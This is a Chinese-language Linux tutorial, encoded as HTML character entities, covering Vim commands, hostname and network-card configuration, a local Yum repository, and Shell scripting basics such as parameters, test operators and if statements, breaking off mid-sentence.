ESC&#x8FD4;&#x56DE;&#x547D;&#x4EE4;&#x6A21;&#x5F0F; Vim &#x4E2D;&#x5E38;&#x7528;&#x7684;&#x547D;&#x4EE4;&#xFF1A; 12345678dd &#x5220;&#x9664;&#xFF08;&#x526A;&#x5207;&#xFF09;&#x5149;&#x6807;&#x6240;&#x5728;&#x6574;&#x884C;5dd &#x5220;&#x9664;&#xFF08;&#x526A;&#x5207;&#xFF09;&#x4ECE;&#x5149;&#x6807;&#x5904;&#x5F00;&#x59CB;&#x7684; 5 &#x884C;yy &#x590D;&#x5236;&#x5149;&#x6807;&#x6240;&#x5728;&#x6574;&#x884C;5yy &#x590D;&#x5236;&#x4ECE;&#x5149;&#x6807;&#x5904;&#x5F00;&#x59CB;&#x7684; 5 &#x884C;n &#x663E;&#x793A;&#x641C;&#x7D22;&#x547D;&#x4EE4;&#x5B9A;&#x4F4D;&#x5230;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;N &#x663E;&#x793A;&#x641C;&#x7D22;&#x547D;&#x4EE4;&#x5B9A;&#x4F4D;&#x5230;&#x7684;&#x4E0A;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;u &#x64A4;&#x9500;&#x4E0A;&#x4E00;&#x6B65;&#x7684;&#x64CD;&#x4F5C;p &#x5C06;&#x4E4B;&#x524D;&#x5220;&#x9664;&#xFF08;dd&#xFF09;&#x6216;&#x590D;&#x5236;&#xFF08;yy&#xFF09;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x7C98;&#x8D34;&#x5230;&#x5149;&#x6807;&#x540E;&#x9762; &#x672B;&#x884C;&#x6A21;&#x5F0F;&#x4E2D;&#x53EF;&#x7528;&#x7684;&#x547D;&#x4EE4;&#xFF1A; 12345678910111213:w &#x4FDD;&#x5B58;:q &#x9000;&#x51FA;:q! &#x5F3A;&#x5236;&#x9000;&#x51FA;&#xFF08;&#x653E;&#x5F03;&#x5BF9;&#x6587;&#x6863;&#x7684;&#x4FEE;&#x6539;&#x5185;&#x5BB9;&#xFF09;:wq! &#x5F3A;&#x5236;&#x4FDD;&#x5B58;&#x9000;&#x51FA;:set nu &#x663E;&#x793A;&#x884C;&#x53F7;:set nonu &#x4E0D;&#x663E;&#x793A;&#x884C;&#x53F7;:&#x547D;&#x4EE4; &#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;:&#x6574;&#x6570; &#x8DF3;&#x8F6C;&#x5230;&#x8BE5;&#x884C;:s/one/two &#x5C06;&#x5F53;&#x524D;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A; one &#x66FF;&#x6362;&#x6210; two:s/one/two/g &#x5C06;&#x5F53;&#x524D;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;&#x7684;&#x6240;&#x6709; one &#x66FF;&#x6362;&#x6210; two:%s/one/two/g &#x5C06;&#x5168;&#x6587;&#x4E2D;&#x7684;&#x6240;&#x6709; one &#x66FF;&#x6362;&#x6210; two?&#x5B57;&#x7B26;&#x4E32; &#x5728;&#x6587;&#x672C;&#x4E2D;&#x4ECE;&#x4E0B;&#x81F3;&#x4E0A;&#x641C;&#x7D22;&#x8BE5;&#x5B57;&#x7B26;&#x4E32;/&#x5B57;&#x7B26;&#x4E32; &#x5728;&#x6587;&#x672C;&#x4E2D;&#x4ECE;&#x4E0A;&#x81F3;&#x4E0B;&#x641C;&#x7D22;&#x8BE5;&#x5B57;&#x7B26;&#x4E32; &#x914D;&#x7F6E;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#xFF1A; &#x4F7F;&#x7528; Vim &#x7F16;&#x8F91;&#x5668;&#x4FEE;&#x6539;&#x201C;/etc/hostname&#x201D;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x6587;&#x4EF6;&#x3002; &#x628A;&#x539F;&#x59CB;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x5220;&#x9664;&#x540E;&#x8FFD;&#x52A0;&#x201C;linuxprobe.com&#x201D;&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x4F7F;&#x7528; Vim &#x7F16;&#x8F91;&#x5668;&#x4FEE;&#x6539;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x8981;&#x5728;&#x672B;&#x884C;&#x6A21;&#x5F0F;&#x4E0B;&#x6267;&#x884C;:wq!&#x547D;&#x4EE4;&#x624D;&#x80FD;&#x4FDD;&#x5B58;&#x5E76;&#x9000;&#x51FA;&#x6587;&#x6863;&#x3002; &#x4FDD;&#x5B58;&#x5E76;&#x9000;&#x51FA;&#x6587;&#x6863;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528; hostname &#x547D;&#x4EE4;&#x68C0;&#x67E5;&#x662F;&#x5426;&#x4FEE;&#x6539;&#x6210; &#x914D;&#x7F6E;&#x7F51;&#x5361;&#x4FE1;&#x606F;&#xFF1A; &#x9996;&#x5148;&#x5207;&#x6362;&#x5230;/etc/sysconfig/network-scripts &#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;&#x3002; &#x4F7F;&#x7528; Vim &#x7F16;&#x8F91;&#x5668;&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x6587;&#x4EF6; ifcfg-eno16777736&#xFF0C;&#x9010;&#x9879;&#x5199;&#x5165;&#x4E0B;&#x9762;&#x7684;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#x5E76;&#x4FDD;&#x5B58;&#x9000;&#x51FA;&#x3002;&#x7531;&#x4E8E;&#x6BCF;&#x53F0;&#x8BBE;&#x5907;&#x7684;&#x786C;&#x4EF6;&#x53CA;&#x67B6;&#x6784;&#x662F;&#x4E0D;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x8BF7;&#x8BFB;&#x8005;&#x4F7F;&#x7528; ifconfig &#x547D;&#x4EE4;&#x81EA;&#x884C;&#x786E;&#x8BA4;&#x5404;&#x81EA;&#x7F51;&#x5361;&#x7684;&#x9ED8;&#x8BA4;&#x540D;&#x79F0;&#x3002; 12345678&#x8BBE;&#x5907;&#x7C7B;&#x578B;&#xFF1A;TYPE=Ethernet&#x5730;&#x5740;&#x5206;&#x914D;&#x6A21;&#x5F0F;&#xFF1A;BOOTPROTO=static&#x7F51;&#x5361;&#x540D;&#x79F0;&#xFF1A;NAME=eno16777736&#x662F;&#x5426;&#x542F;&#x52A8;&#xFF1A;ONBOOT=yesIP &#x5730;&#x5740;&#xFF1A;IPADDR=192.168.10.10&#x5B50;&#x7F51;&#x63A9;&#x7801;&#xFF1A;NETMASK=255.255.255.0&#x7F51;&#x5173;&#x5730;&#x5740;&#xFF1A;GATEWAY=192.168.10.1DNS &#x5730;&#x5740;&#xFF1A;DNS1=192.168.10.1 &#x91CD;&#x542F;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x5E76;&#x6D4B;&#x8BD5;&#x7F51;&#x7EDC;&#x662F;&#x5426;&#x8054;&#x901A;&#x3002;&#x8FDB;&#x5165;&#x5230;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x7F16;&#x8F91;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x5176;&#x4E2D;&#x586B;&#x5165;&#x4E0B;&#x9762;&#x7684;&#x4FE1;&#x606F;&#xFF1A; 1234cd /etc/sysconfig/network-scripts/vim ifcfg-eno16777736systemctl restart networkping 192.168.10.10 &#x914D;&#x7F6E;Yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93; &#x8FDB;&#x5165;&#x5230;/etc/yum.repos.d/&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x56E0;&#x4E3A;&#x8BE5;&#x76EE;&#x5F55;&#x5B58;&#x653E;&#x7740; Yum &#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;&#x3002; &#x4F7F;&#x7528; Vim &#x7F16;&#x8F91;&#x5668;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; rhel7.repo &#x7684;&#x65B0;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x5FC5;&#x987B;&#x4E3A;.repo&#xFF09;&#xFF0C;&#x9010;&#x9879;&#x5199;&#x5165;&#x4E0B;&#x9762;&#x52A0;&#x7C97;&#x7684;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#x5E76;&#x4FDD;&#x5B58;&#x9000;&#x51FA;&#xFF08;&#x4E0D;&#x8981;&#x5199;&#x540E;&#x9762;&#x7684;&#x4E2D;&#x6587;&#x6CE8;&#x91CA;&#xFF09;&#x3002; 123456[rh2l-media]:Yum &#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x7B26;&#xFF0C;&#x907F;&#x514D;&#x4E0E;&#x5176;&#x4ED6;&#x4ED3;&#x5E93;&#x51B2;&#x7A81;&#x3002;name=linuxprobe:Yum &#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x7684;&#x540D;&#x79F0;&#x63CF;&#x8FF0;&#xFF0C;&#x6613;&#x4E8E;&#x8BC6;&#x522B;&#x4ED3;&#x5E93;&#x7528;&#x5904;&#x3002;baseurl=file:///media/cdrom:&#x63D0;&#x4F9B;&#x7684;&#x65B9;&#x5F0F;&#x5305;&#x62EC; FTP&#xFF08;ftp://..&#xFF09;&#x3001;HTTP&#xFF08;http://..&#xFF09;&#x3001;&#x672C;&#x5730;&#xFF08;file:///..&#xFF09;&#x3002;enabled=1:&#x8BBE;&#x7F6E;&#x6B64;&#x6E90;&#x662F;&#x5426;&#x53EF;&#x7528;&#xFF1B;1 &#x4E3A;&#x53EF;&#x7528;&#xFF0C;0 &#x4E3A;&#x7981;&#x7528;&#x3002;gpgcheck=1:&#x8BBE;&#x7F6E;&#x6B64;&#x6E90;&#x662F;&#x5426;&#x6821;&#x9A8C;&#x6587;&#x4EF6;&#xFF1B;1 &#x4E3A;&#x6821;&#x9A8C;&#xFF0C;0 &#x4E3A;&#x4E0D;&#x6821;&#x9A8C;&#x3002;gpgkey=file:///media/cdrom/RPM-GPG-KEY-redhat-release:&#x82E5;&#x4E0A;&#x9762;&#x53C2;&#x6570;&#x5F00;&#x542F;&#x6821;&#x9A8C;&#xFF0C;&#x90A3;&#x4E48;&#x8BF7;&#x6307;&#x5B9A;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x5730;&#x5740;&#x3002; &#x6309;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#x7684;&#x8DEF;&#x5F84;&#x6302;&#x8F7D;&#x5149;&#x76D8;&#xFF0C;&#x5E76;&#x628A;&#x5149;&#x76D8;&#x6302;&#x8F7D;&#x4FE1;&#x606F;&#x5199;&#x5165;&#x5230;/etc/fstab &#x6587;&#x4EF6;&#x4E2D;&#x3002; 1234mkdir -p /media/cdrommount /dev/cdrom /media/cdromvim /etc/fstabyum install httpd &#x4F7F;&#x7528;&#x201C;yum install httpd -y&#x201D;&#x547D;&#x4EE4;&#x68C0;&#x67E5; Yum &#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x53EF;&#x7528; &#x5C1D;&#x8BD5;&#x4F7F;&#x7528; Yum &#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x6765;&#x5B89;&#x88C5; Web &#x670D;&#x52A1;&#xFF0C;&#x51FA;&#x73B0; Complete&#xFF01;&#x5219;&#x4EE3;&#x8868;&#x914D;&#x7F6E;&#x6B63;&#x786E;. &#x7F16;&#x5199;Shell&#x811A;&#x672C;&#x4EA4;&#x4E92;&#x5F0F;&#xFF08;Interactive&#xFF09;&#xFF1A;&#x7528;&#x6237;&#x6BCF;&#x8F93;&#x5165;&#x4E00;&#x6761;&#x547D;&#x4EE4;&#x5C31;&#x7ACB;&#x5373;&#x6267;&#x884C;&#x3002; &#x6279;&#x5904;&#x7406;&#xFF08;Batch&#xFF09;&#xFF1A;&#x7531;&#x7528;&#x6237;&#x4E8B;&#x5148;&#x7F16;&#x5199;&#x597D;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684; Shell &#x811A;&#x672C;&#xFF0C;Shell &#x4F1A;&#x4E00;&#x6B21;&#x6027;&#x6267;&#x884C;&#x811A;&#x672C;&#x4E2D;&#x8BF8;&#x591A;&#x7684;&#x547D;&#x4EE4;&#x3002; echo $SHELL &#x8F93;&#x51FA;&#x5F53;&#x524D;&#x547D;&#x4EE4;&#x7EC8;&#x7AEF;&#x89E3;&#x91CA;&#x5668; &#x7F16;&#x5199;&#x7B80;&#x5355;&#x7684;&#x811A;&#x672C;&#xFF1A; (&#x67E5;&#x770B;&#x5F53;&#x524D;&#x6240;&#x5728;&#x5DE5;&#x4F5C;&#x8DEF;&#x5F84;&#x5E76;&#x5217;&#x51FA;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x6240;&#x6709;&#x7684;&#x6587;&#x4EF6;&#x53CA;&#x5C5E;&#x6027;&#x4FE1;&#x606F;) 1234#!/bin/bash#For Example BY linuxprobe.compwdls -al &#x7B2C;&#x4E00;&#x884C;&#x7684;&#x811A;&#x672C;&#x58F0;&#x660E;&#xFF08;#!&#xFF09;&#x7528;&#x6765;&#x544A;&#x8BC9;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;&#x54EA;&#x79CD; Shell &#x89E3;&#x91CA;&#x5668;&#x6765;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;; &#x7B2C;&#x4E8C;&#x884C;&#x7684;&#x6CE8;&#x91CA;&#x4FE1;&#x606F;&#xFF08;#&#xFF09;&#x662F;&#x5BF9;&#x811A;&#x672C;&#x529F;&#x80FD;&#x548C;&#x67D0;&#x4E9B;&#x547D;&#x4EE4;&#x7684;&#x4ECB;&#x7ECD;&#x4FE1;&#x606F;; &#x7B2C;&#x4E09;&#x3001;&#x56DB;&#x884C;&#x7684;&#x53EF;&#x6267;&#x884C;&#x8BED;&#x53E5;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E73;&#x65F6;&#x6267;&#x884C;&#x7684; Linux &#x547D;&#x4EE4;&#x4E86;&#x3002; &#x63A5;&#x6536;&#x7528;&#x6237;&#x7684;&#x53C2;&#x6570;&#xFF1A; &#x5185;&#x8BBE;&#x7684;&#x7528;&#x4E8E;&#x63A5;&#x53D7;&#x53C2;&#x6570;&#x7684;&#x53D8;&#x91CF;&#xFF1A; 12345$0 &#x5BF9;&#x5E94;&#x7684;&#x662F;&#x5F53;&#x524D; Shell &#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x7684;&#x540D;&#x79F0;$# &#x5BF9;&#x5E94;&#x7684;&#x662F;&#x603B;&#x5171;&#x6709;&#x51E0;&#x4E2A;&#x53C2;&#x6570;$* &#x5BF9;&#x5E94;&#x7684;&#x662F;&#x6240;&#x6709;&#x4F4D;&#x7F6E;&#x7684;&#x53C2;&#x6570;&#x503C;$? &#x5BF9;&#x5E94;&#x7684;&#x662F;&#x663E;&#x793A;&#x4E0A;&#x4E00;&#x6B21;&#x547D;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x8FD4;&#x56DE;&#x503C;&#x800C;$1&#x3001;$2&#x3001;$3&#x2026;&#x2026;&#x5219;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x7740;&#x7B2C; N &#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x53C2;&#x6570;&#x503C; 12345#!/bin/bash#For Example BY linuxprobe.comscript&apos;s name is $0&quot;echo &quot;All we have $# parameter, which is $*.&quot;echo &quot;The first parameter is $1, the fifth is $5.&quot; &#x5224;&#x65AD;&#x7528;&#x6237;&#x7684;&#x53C2;&#x6570;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#x7684;&#x683C;&#x5F0F;&#xFF1A; [ &#x6761;&#x4EF6;&#x8868;&#x8FBE;&#x5F0F; ] &#x6309;&#x7167;&#x6D4B;&#x8BD5;&#x5BF9;&#x8C61;&#x6765;&#x5212;&#x5206;&#xFF0C;&#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#x53EF;&#x4EE5;&#x5206;&#x4E3A; 4 &#x79CD;&#xFF1A; 1234&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#xFF1B;&#x903B;&#x8F91;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#xFF1B;&#x6574;&#x6570;&#x503C;&#x6BD4;&#x8F83;&#x8BED;&#x53E5;&#xFF1B;&#x5B57;&#x7B26;&#x4E32;&#x6BD4;&#x8F83;&#x8BED;&#x53E5;&#x3002; &#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x6240;&#x7528;&#x7684;&#x53C2;&#x6570;&#xFF1A; 123456-d &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x76EE;&#x5F55;&#x7C7B;&#x578B;-e &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5B58;&#x5728;-f &#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x4E00;&#x822C;&#x6587;&#x4EF6;-r &#x6D4B;&#x8BD5;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x6709;&#x6743;&#x9650;&#x8BFB;&#x53D6;-w &#x6D4B;&#x8BD5;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x6709;&#x6743;&#x9650;&#x5199;&#x5165;-x &#x6D4B;&#x8BD5;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x6709;&#x6743;&#x9650;&#x6267;&#x884C; &#x9762;&#x4F7F;&#x7528;&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#x6765;&#x5224;&#x65AD;/etc/fstab &#x662F;&#x5426;&#x4E3A;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x7C7B;&#x578B;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7; Shell &#x89E3;&#x91CA;&#x5668;&#x7684;&#x5185;&#x8BBE;$?&#x53D8;&#x91CF;&#x663E;&#x793A;&#x4E0A;&#x4E00;&#x6761;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x540E;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x3002;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x503C;&#x4E3A; 0&#xFF0C;&#x5219;&#x76EE;&#x5F55;&#x5B58;&#x5728;&#xFF1B;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x975E;&#x96F6;&#x7684;&#x503C;&#xFF0C;&#x5219;&#x610F;&#x5473;&#x7740;&#x76EE;&#x5F55;&#x4E0D;&#x5B58;&#x5728;&#xFF1A; 12[ -d /etc/fstab ]echo $? &#x518D;&#x4F7F;&#x7528;&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#x6765;&#x5224;&#x65AD;/etc/fstab &#x662F;&#x5426;&#x4E3A;&#x4E00;&#x822C;&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x503C;&#x4E3A; 0&#xFF0C;&#x5219;&#x4EE3;&#x8868;&#x6587;&#x4EF6;&#x5B58;&#x5728;&#xFF0C;&#x4E14;&#x4E3A;&#x4E00;&#x822C;&#x6587;&#x4EF6;&#xFF1A; 12[root@linuxprobe ~]# [ -f /etc/fstab ][root@linuxprobe ~]# echo $? &#x5728; Shell&#x7EC8;&#x7AEF;&#x4E2D;&#x903B;&#x8F91;&#x201C;&#x4E0E;&#x201D;&#x7684;&#x8FD0;&#x7B97;&#x7B26;&#x53F7;&#x662F;&amp;&amp;&#xFF0C;&#x5B83;&#x8868;&#x793A;&#x5F53;&#x524D;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x6210;&#x529F;&#x540E;&#x624D;&#x4F1A;&#x6267;&#x884C;&#x5B83;&#x540E;&#x9762;&#x7684;&#x547D;&#x4EE4;. &#x5224;&#x65AD;/dev/cdrom &#x6587;&#x4EF6;&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x82E5;&#x5B58;&#x5728;&#x5219;&#x8F93;&#x51FA; Exist &#x5B57;&#x6837;&#x3002; [ -e /dev/cdrom ] &amp;&amp; echo &quot;Exist&quot; &#x903B;&#x8F91;&#x201C;&#x6216;&#x201D;&#xFF0C;&#x5B83;&#x5728; Linux &#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x8FD0;&#x7B97;&#x7B26;&#x53F7;&#x4E3A;||&#xFF0C;&#x8868;&#x793A;&#x5F53;&#x524D;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5931;&#x8D25;&#x540E;&#x624D;&#x4F1A;&#x6267;&#x884C;&#x5B83;&#x540E;&#x9762;&#x7684;&#x547D;&#x4EE4;. &#x201C;&#x975E;&#x201D;&#xFF0C;&#x5728; Linux &#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x8FD0;&#x7B97;&#x7B26;&#x53F7;&#x662F;&#x4E00;&#x4E2A;&#x53F9;&#x53F7;&#xFF08;&#xFF01;&#xFF09;&#xFF0C;&#x5B83;&#x8868;&#x793A;&#x628A;&#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x4E2D;&#x7684;&#x5224;&#x65AD;&#x7ED3;&#x679C;&#x53D6;&#x76F8;&#x53CD;&#x503C;&#x3002; &#x6765;&#x7ED3;&#x5408;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x53D8;&#x91CF; USER &#x6765;&#x5224;&#x65AD;&#x5F53;&#x524D;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x975E;&#x7BA1;&#x7406;&#x5458;&#x8EAB;&#x4EFD;&#xFF1A; 12345echo $USER[ $USER = root ] || echo &quot;user&quot;[ ! $USER = root ] || echo &quot;user&quot;[ ! $USER = root ] &amp;&amp; echo &quot;user&quot; || echo &quot;root&quot; &#x53EF;&#x7528;&#x7684;&#x6574;&#x6570;&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;&#xFF1A; 123456-eq &#x662F;&#x5426;&#x7B49;&#x4E8E;-ne &#x662F;&#x5426;&#x4E0D;&#x7B49;&#x4E8E;-gt &#x662F;&#x5426;&#x5927;&#x4E8E;-lt &#x662F;&#x5426;&#x5C0F;&#x4E8E;-le &#x662F;&#x5426;&#x7B49;&#x4E8E;&#x6216;&#x5C0F;&#x4E8E;-ge &#x662F;&#x5426;&#x5927;&#x4E8E;&#x6216;&#x7B49;&#x4E8E; 10 &#x662F;&#x5426;&#x5927;&#x4E8E; 10 &#x4EE5;&#x53CA; 10 &#x662F;&#x5426;&#x7B49;&#x4E8E; 10&#xFF08;&#x901A;&#x8FC7;&#x8F93;&#x51FA;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x5185;&#x5BB9;&#x6765;&#x5224;&#x65AD;&#xFF09;&#xFF1A; 12[ 10 -gt 10][ 10 -eq 10 ] &#x6765;&#x5148;&#x4F7F;&#x7528; free -m &#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x91CF;&#x60C5;&#x51B5;&#xFF08;&#x5355;&#x4F4D;&#x4E3A; MB&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7; grep Mem:&#x547D;&#x4EE4;&#x8FC7;&#x6EE4;&#x51FA;&#x5269;&#x4F59;&#x5185;&#x5B58;&#x91CF;&#x7684;&#x884C;&#xFF0C;&#x518D;&#x7528; awk &#x2018;{print $4}&#x2019;&#x547D;&#x4EE4;&#x53EA;&#x4FDD;&#x7559;&#x7B2C;&#x56DB;&#x5217;&#xFF0C;&#x6700;&#x540E;&#x7528; FreeMem=&#x8BED;&#x53E5;&#x7684;&#x65B9;&#x5F0F;&#x628A;&#x8BED;&#x53E5;&#x5185;&#x6267;&#x884C;&#x7684;&#x7ED3;&#x679C;&#x8D4B;&#x503C;&#x7ED9;&#x53D8;&#x91CF;&#x3002; 1FreeMem=`free -m | grep Mem: | awk &apos;{print $4}&apos;` &#x4F7F;&#x7528;&#x6574;&#x6570;&#x8FD0;&#x7B97;&#x7B26;&#x6765;&#x5224;&#x65AD;&#x5185;&#x5B58;&#x53EF;&#x7528;&#x91CF;&#x7684;&#x503C;&#x662F;&#x5426;&#x5C0F;&#x4E8E; 1024&#xFF0C;&#x82E5;&#x5C0F;&#x4E8E;&#x5219;&#x4F1A;&#x63D0;&#x793A;&#x201C;Insufficient Memory&#x201D;&#xFF08;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#xFF09;&#x7684;&#x5B57;&#x6837;&#xFF1A; [ $FreeMem -lt 1024 ] &amp;&amp; echo &quot;Insufficient Memory&quot; &#x5B57;&#x7B26;&#x4E32;&#x6BD4;&#x8F83;&#x8BED;&#x53E5;&#x7528;&#x4E8E;&#x5224;&#x65AD;&#x6D4B;&#x8BD5;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#x503C;&#xFF0C;&#x6216;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x76F8;&#x540C;&#x3002;&#x5B83;&#x7ECF;&#x5E38;&#x7528;&#x6765;&#x5224;&#x65AD;&#x67D0;&#x4E2A;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x672A;&#x88AB;&#x5B9A;&#x4E49;&#xFF08;&#x5373;&#x5185;&#x5BB9;&#x4E3A;&#x7A7A;&#x503C;&#xFF09; 123= &#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x5185;&#x5BB9;&#x662F;&#x5426;&#x76F8;&#x540C;!= &#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x5185;&#x5BB9;&#x662F;&#x5426;&#x4E0D;&#x540C;-z &#x5224;&#x65AD;&#x5B57;&#x7B26;&#x4E32;&#x5185;&#x5BB9;&#x662F;&#x5426;&#x4E3A;&#x7A7A; &#x8FC7;&#x5224;&#x65AD; String &#x53D8;&#x91CF;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#x503C;&#xFF0C;&#x8FDB;&#x800C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B9A;&#x4E49;&#x4E86;&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#x3002;[ -z $String] &#x6D41;&#x7A0B;&#x63A7;&#x5236;&#x8BED;&#x53E5; if &#x8BED;&#x53E5; 123456789101112131415161718192021222324252627282930if &#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x64CD;&#x4F5C; then &#x547D;&#x4EE4;&#x5E8F;&#x5217;fi#!/bin/bashDIR=&quot;/media/cdrom&quot;if [ ! -e $DIR ]thenmkdir -p $DIRfi&#x5224;&#x65AD;&#x662F;&#x5426;&#x521B;&#x5EFA;&#x6210;&#x529F;&#xFF1A;bash mkcdrom.shls -d /media/cdromif &#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x64CD;&#x4F5C; then &#x547D;&#x4EE4;&#x5E8F;&#x5217;1 else &#x547D;&#x4EE4;&#x5E8F;&#x5217;2fiif &#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x64CD;&#x4F5C;1 then &#x547D;&#x4EE4;&#x5E8F;&#x5217;1elif &#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x64CD;&#x4F5C;2 then &#x547D;&#x4EE4;&#x5E8F;&#x5217;2else &#x547D;&#x4EE4;&#x5E8F;&#x5217;3fi &#x4F7F;&#x7528;&#x53CC;&#x5206;&#x652F;&#x7684; if &#x6761;&#x4EF6;&#x8BED;&#x53E5;&#x6765;&#x9A8C;&#x8BC1;&#x67D0;&#x53F0;&#x4E3B;&#x673A;&#x662F;&#x5426;&#x5728;&#x7EBF;&#xFF0C;&#x7136;&#x540E;&#x6839;&#x636E;&#x8FD4;&#x56DE;&#x503C;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x8981;&#x4E48;&#x663E;&#x793A;&#x4E3B;&#x673A;&#x5728;&#x7EBF;&#x4FE1;&#x606F;&#xFF0C;&#x8981;&#x4E48;&#x663E;&#x793A;&#x4E3B;&#x673A;&#x4E0D;&#x5728;&#x7EBF;&#x4FE1;&#x606F;&#x3002; &#x811A;&#x672C;&#x4E3B;&#x8981;&#x4F7F;&#x7528; ping &#x547D;&#x4EE4;&#x6765;&#x6D4B;&#x8BD5;&#x4E0E;&#x5BF9;&#x65B9;&#x4E3B;&#x673A;&#x7684;&#x7F51;&#x7EDC;&#x8054;&#x901A;&#x6027;&#xFF0C;&#x800C; Linux &#x7CFB;&#x7EDF;&#x4E2D;&#x7684; ping &#x547D;&#x4EE4;&#x4E0D;&#x50CF; Windows &#x4E00;&#x6837;&#x5C1D;&#x8BD5; 4 